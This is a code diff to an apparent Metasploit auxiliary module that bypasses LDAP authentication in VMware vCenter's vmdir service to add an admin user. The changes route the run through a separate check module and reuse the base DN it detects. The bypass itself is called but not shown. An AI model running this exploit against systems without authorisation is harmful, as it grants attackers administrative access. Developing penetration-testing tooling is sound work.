@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::CheckModule
 
   def initialize(info = {})
     super(update_info(info,
@@ -33,6 +34,9 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Actions'        => [['Add', 'Description' => 'Add an admin user']],
       'DefaultAction'  => 'Add',
+      'DefaultOptions' => {
+        'CheckModule'  => 'auxiliary/gather/vmware_vcenter_vmdir'
+      },
       'Notes'          => {
         'Stability'    => [SERVICE_RESOURCE_LOSS],
         'SideEffects'  => [IOC_IN_LOGS, CONFIG_CHANGES]
@@ -40,8 +44,8 @@ class MetasploitModule < Msf::Auxiliary
     ))
 
     register_options([
-      OptString.new('USERNAME', [true, 'Username of admin user to add']),
-      OptString.new('PASSWORD', [true, 'Password of admin user to add'])
+      OptString.new('USERNAME', [false, 'Username of admin user to add']),
+      OptString.new('PASSWORD', [false, 'Password of admin user to add'])
     ])
 
     register_advanced_options([
@@ -70,6 +74,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    # NOTE: check is provided by auxiliary/gather/vmware_vcenter_vmdir
+    checkcode = check
+
+    return unless checkcode == Exploit::CheckCode::Vulnerable
+
+    # HACK: We stashed the detected base DN in the CheckCode's reason
+    @base_dn = checkcode.reason
+
+    unless username && password
+      print_error('Please set the USERNAME and PASSWORD options to proceed')
+      return
+    end
+
     opts = {
       host:            rhost,
       port:            rport,
@@ -77,12 +94,6 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     Net::LDAP.open(opts) do |ldap|
-      print_status('Discovering base DN automatically')
-
-      unless (@base_dn = discover_base_dn(ldap))
-        print_warning('Falling back on default base DN of dc=vsphere,dc=local')
-      end
-
       print_status("Bypassing LDAP auth in vmdir service at #{peer}")
       auth_bypass(ldap)
 
